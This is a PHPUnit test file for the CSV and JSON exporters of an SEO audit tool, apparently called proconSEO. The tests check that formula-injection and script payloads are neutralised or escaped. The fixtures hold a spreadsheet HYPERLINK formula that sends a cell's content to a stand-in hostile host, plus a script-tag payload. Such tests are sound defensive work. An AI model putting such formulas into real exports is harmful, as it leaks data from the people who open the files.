<?php

declare(strict_types=1);

namespace ProconSEO\Tests\Export;

use PHPUnit\Framework\Attributes\DataProvider;
use PHPUnit\Framework\TestCase;
use ProconSEO\Export\DatosExportacion;
use ProconSEO\Export\ExportadorCsv;
use ProconSEO\Export\ExportadorJson;

/**
 * Exportaciones a CSV y JSON (RF-50 a RF-52; decisión 17), con datos de ejemplo sin base de datos.
 */
final class ExportadoresTest extends TestCase
{
    private const FORMULA = '=HYPERLINK("https://malo.example/?d="&A1,"clic")';
    private const HTML = '<script>alert(1)</script>';

    public function testCsvParaExcelEnEspanol(): void
    {
        $csv = ExportadorCsv::generar($this->datos());

        self::assertStringStartsWith("\xEF\xBB\xBF", $csv, 'UTF-8 con BOM para que Excel lea bien las tildes');
        self::assertStringContainsString("\r\n", $csv);
        $filas = $this->filas($csv);
        self::assertSame(ExportadorCsv::COLUMNAS, $filas[0], 'La primera fila son las columnas, separadas por punto y coma');
        foreach ($filas as $fila) {
            self::assertCount(count(ExportadorCsv::COLUMNAS), $fila, 'Todas las filas tienen las mismas columnas');
        }
    }

    public function testCsvConservaEstadosEvidenciasRevisionesYLimites(): void
    {
        $tipos = array_count_values(array_column(array_slice($this->filas(ExportadorCsv::generar($this->datos())), 1), 0));

        self::assertSame(1, $tipos['Aviso'], 'RF-52: aviso de datos de prueba');
        self::assertSame(18, $tipos['Resumen'], '3 bloques × 6 estados, con los ceros');
        self::assertSame(2, $tipos['Resultado']);
        self::assertSame(1, $tipos['Revisión']);
        self::assertSame(1, $tipos['Recurso no descargado'], 'RF-51: fallos de acceso');
        self::assertSame(2, $tipos['Límite'], 'RF-51: fases omitidas y eventos de seguridad');

        $resultado = $this->fila($this->datos(), 'Resultado', 'SEO-01.noindex-desarrollo');
        self::assertSame('correcto', $resultado['Estado vigente']);
        self::assertSame('problema', $resultado['Estado original'], 'Se conservan el estado original y el vigente');
        self::assertSame('', $resultado['Gravedad'], 'Sin gravedad si el estado vigente no es problema');
        self::assertStringContainsString('E-001: <meta name="robots"', $resultado['Evidencias']);
        self::assertSame('1', $resultado['Revisiones']);
        self::assertSame('SÍ', $resultado['Datos de prueba']);

        $acc = $this->fila($this->datos(), 'Resultado', 'ACC-03.declaracion-accesibilidad');
        self::assertSame('Normativa: Real Decreto 1112/2018', $acc['Referencia']);
    }

    /** @return iterable<string, array{string, string}> */
    public static function celdasPeligrosas(): iterable
    {
        yield 'igual' => ['=1+1', "'=1+1"];
        yield 'más' => ['+34 987 000 000', "'+34 987 000 000"];
        yield 'menos' => ['-2+3', "'-2+3"];
        yield 'arroba' => ['@SUM(A1)', "'@SUM(A1)"];
        yield 'tabulador' => ["\t=1", "'\t=1"];
        yield 'retorno' => ["\r=1", "'\r=1"];
        yield 'normal' => ['Hola = mundo', 'Hola = mundo'];
        yield 'vacía' => ['', ''];
    }

    #[DataProvider('celdasPeligrosas')]
    public function testNeutralizaFormulas(string $celda, string $esperado): void
    {
        self::assertSame($esperado, ExportadorCsv::neutralizar($celda));
    }

    public function testElContenidoDeLaWebNoPuedeColarFormulas(): void
    {
        $csv = ExportadorCsv::generar($this->datos());

        foreach (array_slice($this->filas($csv), 1) as $fila) {
            foreach ($fila as $celda) {
                self::assertDoesNotMatchRegularExpression('/^[=+\-@\t\r]/', $celda, "Celda sin neutralizar: {$celda}");
            }
        }
        self::assertStringContainsString("'" . self::FORMULA, str_replace('""', '"', $csv));
    }

    public function testJsonCompletoYSeguroDeAbrirEnUnNavegador(): void
    {
        $json = ExportadorJson::generar($this->datos());
        $d = json_decode($json, true, 512, JSON_THROW_ON_ERROR);

        self::assertTrue($d['datos_de_prueba']);
        self::assertSame(self::HTML, $d['resultados'][0]['elemento'], 'El texto se conserva tal cual');
        self::assertStringNotContainsString('<script>', $json, 'Pero < y > van escapados (<)');
        self::assertSame(['E-001'], $d['resultados'][0]['evidencias']);
        self::assertSame('Marta', $d['revisiones'][0]['revisor']);
        self::assertStringNotContainsString('%', (string) json_encode($d['resumen']), 'Sin porcentajes');
    }

    public function testNombreDeFichero(): void
    {
        self::assertSame('proconseo-analisis-7-2026-11-04-DATOS-DE-PRUEBA.csv', DatosExportacion::nombreFichero($this->datos(), 'csv'));
        $real = ['datos_de_prueba' => false] + $this->datos();
        self::assertSame('proconseo-analisis-7-2026-11-04.json', DatosExportacion::nombreFichero($real, 'json'));
        self::assertSame('proconseo-analisis-7-2026-11-04.csv', DatosExportacion::nombreFichero($real, 'c"s;v'), 'La extensión no puede romper la cabecera');
    }

    // ---------- Ayudas ----------

    /** Datos con la forma de DatosExportacion::analisis(). */
    private function datos(): array
    {
        $vacio = ['correcto' => 0, 'mejorable' => 0, 'problema' => 0, 'decision_revisar' => 0, 'no_verificable' => 0, 'no_aplicable' => 0];

        return [
            'formato' => ['nombre' => 'proconSEO', 'version' => '1'],
            'datos_de_prueba' => true,
            'aviso' => 'DATOS DE PRUEBA: estos resultados son de demostración y no corresponden a ninguna web real.',
            'nota' => 'Recuento',
            'analisis' => [
                'id' => 7, 'proyecto' => ['id' => 2, 'nombre' => self::FORMULA, 'tipo' => 'web_kit_digital', 'sector' => null],
                'url_introducida' => 'https://ejemplo.es', 'url_final' => 'https://ejemplo.es/', 'alcance' => 'url_individual',
                'objetivo' => null, 'hosts_autorizados' => ['ejemplo.es'], 'estado' => 'completado', 'motivo_cierre' => null,
                'perfil_ejecucion' => 'v1', 'version_catalogo' => '1.0.0',
                'creado_en_utc' => '2026-11-04 09:42:00.000', 'iniciado_en_utc' => null, 'terminado_en_utc' => null,
            ],
            'resumen' => ['ia' => $vacio, 'seo' => ['correcto' => 1] + $vacio, 'acc' => ['decision_revisar' => 1] + $vacio],
            'resultados' => [
                $this->resultado(['id' => 1, 'comprobacion' => 'SEO-01.noindex-desarrollo', 'estado_original' => 'problema', 'estado_vigente' => 'correcto', 'gravedad' => null, 'elemento' => self::HTML, 'evidencias' => ['E-001'], 'valor_observado' => self::FORMULA]),
                $this->resultado(['id' => 2, 'comprobacion' => 'ACC-03.declaracion-accesibilidad', 'bloque' => 'acc', 'estado_original' => 'decision_revisar', 'estado_vigente' => 'decision_revisar', 'normativa' => 'Real Decreto 1112/2018', 'explicacion_sencilla' => '-1 enlaces']),
            ],
            'evidencias' => [
                ['codigo' => 'E-001', 'tipo' => 'fragmento_html', 'contenido' => '<meta name="robots" content="noindex">', 'captura' => null, 'url' => 'https://ejemplo.es/', 'truncada' => false, 'revision_id' => null, 'capturada_en_utc' => null],
                ['codigo' => 'E-002', 'tipo' => 'texto', 'contenido' => '@cliente: es intencionado', 'captura' => null, 'url' => null, 'truncada' => false, 'revision_id' => 9, 'capturada_en_utc' => null],
            ],
            'revisiones' => [
                ['id' => 9, 'resultado_id' => 1, 'comprobacion' => 'SEO-01.noindex-desarrollo', 'revisor' => 'Marta', 'motivo' => 'Confirmar', 'decision' => 'cambiar_estado', 'nuevo_estado' => 'correcto', 'justificacion' => '+ el cliente lo confirma', 'evidencias' => ['E-002'], 'creada_en_utc' => null],
            ],
            'recursos' => [
                ['url' => 'https://ejemplo.es/', 'url_final' => null, 'estado_http' => 200, 'resultado' => 'correcto', 'motivo' => null, 'truncado' => false, 'bytes' => 100, 'justificado_por' => null],
                ['url' => 'https://ejemplo.es/sitemap.xml', 'url_final' => null, 'estado_http' => 503, 'resultado' => 'error_http', 'motivo' => 'El servidor no responde', 'truncado' => false, 'bytes' => 0, 'justificado_por' => 'IA-08'],
            ],
            'fases' => [['fase' => 'renderizado', 'estado' => 'omitida', 'mensaje' => null], ['fase' => 'validacion', 'estado' => 'terminada', 'mensaje' => null]],
            'eventos_seguridad' => [['regla' => 'SEG-03', 'fase' => null, 'url' => null, 'condicion' => 'HTTP sin cifrar', 'decision' => 'continuar']],
        ];
    }

    private function resultado(array $campos): array
    {
        return $campos + [
            'criterio' => 'SEO-01', 'nombre' => 'Nombre', 'bloque' => 'seo', 'revisado' => false, 'revision_pendiente' => false,
            'gravedad' => null, 'esfuerzo' => 'bajo', 'ejecucion' => 'ejecutada', 'cobertura' => 'implementada', 'tipo_conclusion' => 'hecho',
            'modo' => null, 'url' => 'https://ejemplo.es/', 'elemento' => null, 'valor_observado' => null, 'explicacion_sencilla' => 'Explicación',
            'consecuencia' => null, 'correccion' => null, 'correccion_cms' => null, 'limitacion' => null, 'motivo_revision' => null,
            'wcag' => null, 'normativa' => null, 'causa' => null, 'fuente' => null, 'evidencias' => [], 'version_regla' => 'v1',
        ];
    }

    /** @return list<list<string>> */
    private function filas(string $csv): array
    {
        $flujo = fopen('php://temp', 'r+');
        fwrite($flujo, substr($csv, 3));
        rewind($flujo);
        $filas = [];
        while (($fila = fgetcsv($flujo, null, ';', '"', '')) !== false) {
            $filas[] = $fila;
        }
        fclose($flujo);

        return $filas;
    }

    /** @return array<string, string> */
    private function fila(array $datos, string $tipo, string $comprobacion): array
    {
        $filas = $this->filas(ExportadorCsv::generar($datos));
        foreach (array_slice($filas, 1) as $fila) {
            $f = array_combine(ExportadorCsv::COLUMNAS, $fila);
            if ($f['Tipo'] === $tipo && $f['Comprobación'] === $comprobacion) {
                return $f;
            }
        }
        self::fail("No hay fila {$tipo} {$comprobacion}");
    }
}
